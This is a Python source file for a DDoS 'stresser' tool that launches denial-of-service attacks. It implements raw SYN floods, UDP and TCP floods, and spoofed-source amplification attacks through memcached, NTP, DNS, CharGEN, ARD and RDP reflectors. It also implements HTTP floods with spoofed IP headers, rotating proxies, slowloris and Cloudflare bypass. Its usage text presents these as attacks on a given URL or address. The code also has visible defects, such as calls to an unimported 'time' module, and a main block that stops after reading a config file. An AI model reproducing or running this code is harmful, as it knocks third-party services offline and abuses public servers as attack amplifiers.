#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from concurrent.futures import ThreadPoolExecutor
from contextlib import suppress, contextmanager
from functools import partial
from itertools import cycle
from json import load
from math import trunc, log2
from multiprocessing import Pool
from os import urandom as randbytes
from pathlib import Path
from random import randint, choice as randchoice
from re import compile
from socket import (IP_HDRINCL, IPPROTO_IP, inet_ntoa, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, SOL_TCP, socket,
                    SOCK_DGRAM, SOCK_RAW, gethostname)
from ssl import SSLContext, create_default_context, CERT_NONE
from string import ascii_letters
from struct import pack as data_pack
from sys import argv, exit
from threading import Thread, Event, Lock
from time import sleep
from typing import Set, List, Any, Tuple

from certifi import where
from cloudscraper import create_scraper
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data
from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
from requests import get, Session, exceptions
from socks import socksocket, HTTP, SOCKS5, SOCKS4
from yarl import URL

localIP = get('http://ip.42.pl/raw').text
currentDir = Path(__file__).parent

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__ = "2.0 SNAPSHOT"


class Methods:
    LAYER7_METHODS: Set[str] = {"CFB", "BYPASS", "GET", "POST", "OVH", "STRESS",
                                "DYN", "SLOW", "HEAD", "NULL", "COOKIE", "PPS",
                                "EVEN", "GSB", "DGB", "AVB"}

    LAYER4_METHODS: Set[str] = {"TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM",
                                "NTP", "DNS", "ARD", "CHAR", "RDP"}
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


class Tools:
    randString = lambda length: ''.join(randchoice(ascii_letters) for _ in range(length))
    randIPv4 = lambda: inet_ntoa(data_pack('>I', randint(1, 0xffffffff)))

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return f"-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num


class Proxy:
    port: int
    host: str
    typeInt: int

    def __init__(self, host: str, port: int, typeInt: int) -> None:
        self.host = host
        self.port = port
        self.typeInt = typeInt
        self._typeName = "SOCKS4" if typeInt == 4 else \
            "SOCKS5" if typeInt == 5 else \
                "HTTP"

    def __str__(self):
        return "%s:%d" % (self.host, self.port)

    def __repr__(self):
        return "%s:%d" % (self.host, self.port)

    def toRequests(self):
        return {'http': "%s://%s:%d" % (self._typeName.lower(),
                                        self.host,
                                        self.port)}


class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle

    def __init__(self, target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 bytesPerSecond: int = 125000):
        super().__init__(daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._synevent = synevent
        self.bytesPerSecond = bytesPerSecond


    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    
    def calculatePacketSize(self, packet):
        size = 0
        for i in packet:
            if type(i) == bytes:
                size += len(i)
            
            else:
                size += self.calculatePacketSize(i)

        return size


    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
        if name == "RDP":
            self._amp_payload = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                                 b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())


    def TCP(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            s.connect(self._target)

            tourCount = self.bytesPerSecond / 1024
            sleepTime = 1000 / tourCount
            while s.send(randbytes(1024)):
                sleep(sleepTime / 1000)
                continue


    def MINECRAFT(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            s.connect(self._target)

            payload = b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA'
            s.send(payload)

            tourCount = self.bytesPerSecond / 2
            sleepTime = 1000 / tourCount

            while s.send(b'\x01'):
                s.send(b'\x00')
                sleep(sleepTime / 1000)
                continue


    def UDP(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_DGRAM) as s:

            tourCount = self.bytesPerSecond / 2
            sleepTime = 1000 / tourCount
            while s.sendto(randbytes(1024), self._target):
                sleep(sleepTime / 1000)
                continue


    def SYN(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            payload = self._genrate_syn()

            tourCount = self.bytesPerSecond / (len(payload) + 1)
            sleepTime = 1000 / tourCount
            while s.sendto(payload, self._target):
                sleep(sleepTime / 1000)
                payload = self._genrate_syn()
                continue


    def AMP(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

            payload = next(self._amp_payloads)
            payloadSize = self.calculatePacketSize(payload)
            tourCount = self.bytesPerSecond / (payloadSize + 1)
            sleepTime = 1000 / tourCount

            while s.sendto(*next(self._amp_payloads)):
                sleep(sleepTime / 1000)
                continue


    def VSE(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_DGRAM) as s:

            tourCount = self.bytesPerSecond / 26
            sleepTime = 1000 / tourCount

            while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                            b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
                sleep(sleepTime / 1000)
                continue


    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(localIP)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(randint(1, 65535))
        ip.contains(tcp)
        packet = ip.get_packet()
        return packet


    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


class HttpFlood(Thread):
    _proxies: cycle = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    bytesPerSecond: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self, target: URL, method: str = "GET", bytesPerSecond: int = 1024,
                 synevent: Event = None, useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxy_type: int = 1,
                 maxBytes: int = 125000,
                 proxies: Set[Proxy] = None) -> None:
        super().__init__(daemon=True)
        self.SENT_FLOOD = None
        self._synevent = synevent
        self.bytesPerSecond = bytesPerSecond
        self._method = method
        self._proxy_type = self.getProxyType(list(({proxy_type} & {1, 4, 5}) or 1)[0])
        self._target = target
        self.maxBytes = maxBytes
        if not referers:
            referers: List[str] = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                                   ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                                   "/sharer.php?u=",
                                   ",https://drive.google.com/viewerng/viewer?url=",
                                   ",https://www.google.com/translate?u="]
        self._referers = list(referers)
        if proxies:
            self._proxies = cycle(proxies)
        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0']
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type, target.raw_path_qs)
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    
    def calculateHeaderSize(self, headers):
        return sum(len(key) + len(value) + 4 for key, value in headers.items()) + 2


    def calculateRequestSize(self, req):
        requestLineSize = len(req.request.method) + len(req.request.path_url) + 12
        requestSize = requestLineSize + self.calculateHeaderSize(req.request.headers) + int(req.request.headers.get('content-length', 0))
        
        return requestSize


    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()


    @property
    def SpoofIP(self) -> str:
        spoof: str = Tools.randIPv4()
        payload: str = ""
        payload += "X-Forwarded-Proto: Http\r\n"
        payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
        payload += f"Via: {spoof}\r\n"
        payload += f"Client-IP: {spoof}\r\n"
        payload += f'X-Forwarded-For: {spoof}\r\n'
        payload += f'Real-IP: {spoof}\r\n'
        return payload


    def generate_payload(self, other: str = None) -> bytes:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += other if other else ""
        return str.encode(f"{payload}\r\n")


    def setup_socksocket(self, sock) -> socksocket:
        if self._proxies:
            proxy: Proxy = next(self._proxies)
            sock.set_proxy(self._proxy_type, proxy.host, proxy.port)
        if self._target.scheme == "https":
            sock = ctx.wrap_socket(sock, server_hostname=self._target.host, server_side=False,
                                   do_handshake_on_connect=True, suppress_ragged_eofs=True)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.connect((self._target.host, self._target.port or 80))
        return sock


    @property
    def randHeadercontent(self) -> str:
        payload: str = ""
        payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
        payload += f"Referrer: {randchoice(self._referers)}\r\n"
        payload += self.SpoofIP
        return payload


    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "GET", "COOKIE", "OVH", "EVEN",
                                            "STRESS", "DYN", "SLOW", "PPS"} \
            else "POST" if {method.upper()} & {"POST"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"


    def POST(self) -> None:
        payload: bytes = self.generate_payload((f"Content-Length: {32}\r\n"
                                                "X-Requested-With: XMLHttpRequest\r\n"
                                                "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\n"
                                                f"data={Tools.randString(32)}\r\n"))

        tourCount = self.bytesPerSecond / (len(payload) + 1)
        sleepTime = 1000 / tourCount

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
            while s.send(payload):
                sleep(sleepTime / 1000)


    def STRESS(self) -> None:
        payload: bytes = self.generate_payload((f"Content-Length: {2048}\r\n"
                                                "X-Requested-With: XMLHttpRequest\r\n"
                                                "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\n"
                                                f"data={Tools.randString(2048)}\r\n"
                                                "Cookie: %s=%s" % (Tools.randString(12),
                                                                   Tools.randString(100))))
        
        tourCount = self.bytesPerSecond / (len(payload) + 1)
        sleepTime = 1000 / tourCount

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
            while s.send(payload):
                sleep(sleepTime / 1000)


    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload("Cookie: _ga=GA%s;"
                                               " _gat=1;"
                                               " __cfduid=dc232334gwdsd23434542342342342475611928;"
                                               " %s=%s\r\n" % (randint(1000, 99999),
                                                               Tools.randString(6),
                                                               Tools.randString(32)))
                                                    
        tourCount = self.bytesPerSecond / (len(payload) + 1)
        sleepTime = 1000 / tourCount

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
            while s.send(payload):
                sleep(sleepTime / 1000)


    def PPS(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:

            payload = self._defaultpayload
            tourCount = self.bytesPerSecond / (len(payload) + 1)
            sleepTime = 1000 / tourCount

            while s.send(self._defaultpayload):
                sleep(sleepTime / 1000)


    def GET(self) -> None:
        payload: bytes = self.generate_payload()

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:

            tourCount = self.bytesPerSecond / (len(payload) + 1)
            sleepTime = 1000 / tourCount

            while s.send(payload):
                sleep(sleepTime / 1000)


    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:

            tourCount = self.bytesPerSecond / len(payload)
            sleepTime = 1000 / tourCount

            while s.send(payload) and s.recv(1):
                time.sleep(sleepTime / 1000)
                continue


    def OVH(self) -> None:
        payload: bytes = self.generate_payload()

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:

            tourCount = self.bytesPerSecond / len(payload)
            sleepTime = 1000 / tourCount

            while s.send(payload):
                time.sleep(sleepTime / 1000)


    def CFB(self):
        pro = None
        if self._proxies:
            pro = next(self._proxies)
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                create_scraper() as s:

            if pro:
                req = s.get(self._target.human_repr(), proxies=pro.toRequests())
            
            else:
                req = s.get(self._target.human_repr())

            tourCount = self.bytesPerSecond / (self.calculateRequestSize(req) + 1)
            sleepTime = 1000 / tourCount

            while True:
                if pro:
                    s.get(self._target.human_repr(), proxies=pro.toRequests())
                
                else:
                    s.get(self._target.human_repr())

                sleep(sleepTime / 1000)


    def AVB(self):
        pro = None
        if self._proxies:
            pro = next(self._proxies)
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                Session() as s:

            if pro:
                req = s.post(self._target.human_repr(), proxies=pro.toRequests())
            
            else:
                req = s.post(self._target.human_repr())

            tourCount = self.bytesPerSecond / (self.calculateRequestSize(req) + 1)
            sleepTime = 1000 / tourCount

            while True:
                if pro:
                    s.post(self._target.human_repr(), proxies=pro.toRequests())
                
                else:
                    s.post(self._target.human_repr())

                sleep(sleepTime / 1000)


    def DGB(self):
        pro = None
        if self._proxies:
            pro = next(self._proxies)
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                create_scraper() as s:

            if pro:
                req = s.post(self._target.human_repr(), proxies=pro.toRequests())
            
            else:
                req = s.post(self._target.human_repr())

            tourCount = self.bytesPerSecond / (self.calculateRequestSize(req) + 1)
            sleepTime = 1000 / tourCount

            while True:
                if pro:
                    s.post(self._target.human_repr(), proxies=pro.toRequests())
                
                else:
                    s.post(self._target.human_repr())

                time.sleep(sleepTime / 1000)


    def DYN(self):
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (Tools.randString(6), self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")

        tourCount = self.bytesPerSecond / (len(payload) + 1)
        sleepTime = 1000 / tourCount

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
            while s.send(payload):
                time.sleep(sleepTime / 1000)


    def GSB(self):
        payload: str | bytes = self._payload
        payload += "Host: %s?q=%s\r\n" % (self._target.authority, Tools.randString(6))
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")

        tourCount = self.bytesPerSecond / (len(payload) + 1)
        sleepTime = 1000 / tourCount

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
            while s.send(payload):
                time.sleep(sleepTime / 1000)


    def NULL(self) -> None:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.raw_authority
        payload += "User-Agent: null\r\n"
        payload += "Referrer: null\r\n"
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")

        tourCount = self.bytesPerSecond / len(payload)
        sleepTime = 1000 / tourCount

        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
            while s.send(payload):
                time.sleep(sleepTime / 1000)


    def SLOW(self):
        payload: bytes = self.generate_payload()

        with suppress(OSError, ConnectionError, TimeoutError), self.setup_socksocket(
                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
            for _ in range(50):
                s.send(payload)
            while s.send(payload) and s.recv(1):
                for i in range(50):
                    s.send(str.encode("X-a: %d\r\n" % randint(1, 5000)))
                    sleep(50 / 15)
                break


    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST": self.SENT_FLOOD = self.POST
        if name == "CFB": self.SENT_FLOOD = self.CFB
        if name == "BYPASS": self.SENT_FLOOD = self.BYPASS
        if name == "OVH": self.SENT_FLOOD = self.OVH
        if name == "AVB": self.SENT_FLOOD = self.AVB
        if name == "STRESS": self.SENT_FLOOD = self.STRESS
        if name == "DYN": self.SENT_FLOOD = self.DYN
        if name == "SLOW": self.SENT_FLOOD = self.SLOW
        if name == "GSB": self.SENT_FLOOD = self.GSB
        if name == "NULL": self.SENT_FLOOD = self.NULL
        if name == "COOKIE": self.SENT_FLOOD = self.COOKIES
        if name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (self._defaultpayload + "\r\n").encode()
        if name == "EVEN": self.SENT_FLOOD = self.EVEN


    def BYPASS(self):
        pro = None
        if self._proxies:
            pro = next(self._proxies)
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                Session() as s:

            if pro:
                req = s.get(self._target.human_repr(), proxies=pro.toRequests())
            
            else:
                req = s.get(self._target.human_repr())

            tourCount = self.bytesPerSecond / (self.calculateRequestSize(req) + 1)
            sleepTime = 1000 / tourCount

            while True:
                if pro:
                    s.get(self._target.human_repr(), proxies=pro.toRequests())
                
                else:
                    s.get(self._target.human_repr())

                time.sleep(sleepTime / 1000)


    @staticmethod
    def getProxyType(typeInt: int):
        return SOCKS4 if typeInt == 4 else \
            SOCKS5 if typeInt == 5 else \
                HTTP


class Regex:
    IP = compile(r"(?:\d{1,3}\.){3}\d{1,3}")
    IPPort = compile(r"((?:\d{1,3}\.){3}\d{1,3})[:](\d+)")


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        proxes: Set[Proxy] = set()
        lock = Lock()
        with ThreadPoolExecutor(max_workers=len(cf["proxy-providers"])) as executor:
            for provider in cf["proxy-providers"]:
                if Proxy_type != provider["type"]: continue
                print(provider)
                executor.submit(ProxyManager.download(provider, proxes, lock))

        return proxes

    @staticmethod
    def download(provider, proxes: Set[Proxy], threadLock: Lock) -> Any:
        with suppress(TimeoutError, exceptions.ConnectionError, exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            for proy in Regex.IPPort.findall(data):
                with threadLock:
                    proxes.add(Proxy(proy[0], int(proy[1]), provider["type"]))
    @contextmanager
    def poolcontext(*args, **kwargs) -> Pool:
        pool = Pool(*args, **kwargs)
        yield pool
        pool.terminate()

    @staticmethod
    def checkProxy(pxy: Proxy, url: str = "https://httpbin.org/get", timeout: int = 1) -> Tuple[bool, Proxy]:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
            return get(url, proxies=pxy.toRequests(), timeout=timeout).status_code not in [400, 403], pxy
        return False, pxy

    @staticmethod
    def checkAll(proxie: Set[Proxy], url: str = "https://httpbin.org/get", timeout: int = 1, threads=100) -> Set[Proxy]:
        print(f"{len(proxie):,} Proxies are getting checked, this may take awhile !")
        with ProxyManager.poolcontext(min(len(proxie), threads)) as pool:
            return {pro[1] for pro in pool.map_async(partial(ProxyManager.checkProxy, url=url, timeout=timeout), proxie).get() if
                    pro[0]}


class ToolsConsole:
    METHODS = {"INFO", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = "%s@BetterStresser:~#" % gethostname()

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if (cmd == "E") or \
                    (cmd == "EXIT") or \
                    (cmd == "Q") or \
                    (cmd == "QUIT") or \
                    (cmd == "LOGOUT") or \
                    (cmd == "CLOSE"):
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print("%s command not found" % cmd)
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        print(("Bytes Sended %s\n"
                               "Bytes Recived %s\n"
                               "Packets Sended %s\n"
                               "Packets Recived %s\n"
                               "ErrIn %s\n"
                               "ErrOut %s\n"
                               "DropIn %s\n"
                               "DropOut %s\n"
                               "Cpu Usage %s\n"
                               "Memory %s\n") % (Tools.humanbytes(t[0]),
                                                 Tools.humanbytes(t[1]),
                                                 Tools.humanformat(t[2]),
                                                 Tools.humanformat(t[3]),
                                                 t[4], t[5], t[6], t[7],
                                                 str(cpu_percent()) + "%",
                                                 str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if (domain.upper() == "E") or \
                                (domain.upper() == "EXIT") or \
                                (domain.upper() == "Q") or \
                                (domain.upper() == "QUIT") or \
                                (domain.upper() == "LOGOUT") or \
                                (domain.upper() == "CLOSE"):
                            exit(-1)
                        if "/" not in domain: continue
                        print('please wait ...', end="\r")

                        with get(domain, timeout=20) as r:
                            print(('status_code: %d\n'
                                   'status: %s') % (r.status_code,
                                                    "ONLINE" if r.status_code <= 500 else "OFFLINE"))
                            return
                    print("Error!         ")

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://', '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    print(("Country: %s\n"
                           "City: %s\n"
                           "Org: %s\n"
                           "Isp: %s\n"
                           "Region: %s\n"
                           ) % (info["country"],
                                info["city"],
                                info["org"],
                                info["isp"],
                                info["region"]))

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)

                    domain = domain.replace('https://', '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    print('please wait ...', end="\r")
                    r = ping(domain, count=5, interval=0.2)
                    print(('Address: %s\n'
                           'Ping: %d\n'
                           'Aceepted Packets: %d/%d\n'
                           'status: %s\n'
                           ) % (r.address,
                                r.avg_rtt,
                                r.packets_received,
                                r.packets_sent,
                                "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print(('* Coded By MH_ProDev For Better Stresser\n'
               'Note: If the Proxy list is empty, the attack will run without proxies\n'
               '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
               ' Layer7: python3 %s <method> <url> <socks_type5.4.1> <threads> <proxylist> <MGBit> <duration>\n'
               ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <MGBit> <reflector file, (only use with Amplification>\n'
               '\n'
               ' > Methods:\n'
               ' - Layer4\n'
               ' | %s | %d Methods\n'
               ' - Layer7\n'
               ' | %s | %d Methods\n'
               ' - Tools\n'
               ' | %s | %d Methods\n'
               ' - Others\n'
               ' | %s | %d Methods\n'
               ' - All %d Methods\n'
               '\n'
               'Example:\n'
               '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
               '    Layer4: python3 %s %s %s %s %s %s') % (argv[0], argv[0],
                                                        ", ".join(Methods.LAYER4_METHODS),
                                                        len(Methods.LAYER4_METHODS),
                                                        ", ".join(Methods.LAYER7_METHODS),
                                                        len(Methods.LAYER7_METHODS),
                                                        ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
                                                        ", ".join(["TOOLS", "HELP", "STOP"]), 3,
                                                        len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                                                        argv[0],
                                                        randchoice([*Methods.LAYER7_METHODS]),
                                                        "https://example.com",
                                                        randchoice([4, 5, 1]),
                                                        randint(850, 1000),
                                                        randchoice([1024,2048,4096]),
                                                        randint(1000, 3600),
                                                        argv[0],
                                                        randchoice([*Methods.LAYER4_METHODS]),
                                                        "8.8.8.8:80",
                                                        randint(850, 1000),
                                                        randint(1000, 3600),
                                                        randchoice([1024,2048,4096])
                                                        ))

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
            return s.json()
        return {"success": False}


if __name__ == '__main__':

    with open(currentDir / "config.json") as f:
        con = load(f)
